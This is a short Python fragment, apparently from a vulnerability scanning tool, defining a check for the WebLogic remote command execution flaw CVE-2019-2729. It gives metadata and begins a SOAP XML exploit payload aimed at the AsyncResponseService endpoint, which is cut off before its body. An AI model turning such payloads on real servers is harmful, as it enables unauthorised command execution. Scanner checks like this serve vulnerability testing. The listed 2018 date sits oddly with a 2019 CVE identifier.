...
class CVE_2019_2729_BaseVerify:
    def __init__(self, url):
        self.info = {
            ...
            'description': 'CVE-2019-2729漏洞可执行任意命令,影响范围为: Weblogic 10.3.6.0.0, 12.1.3.0.0 and 12.2.1.3.0.',
            'date': '2018-12-14',
            'exptype': 'check',
            'type': 'RCE'
        }
        ...
        self.payload = '''<?xml version="1.0" encoding="utf-8"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
            <soapenv:Header>
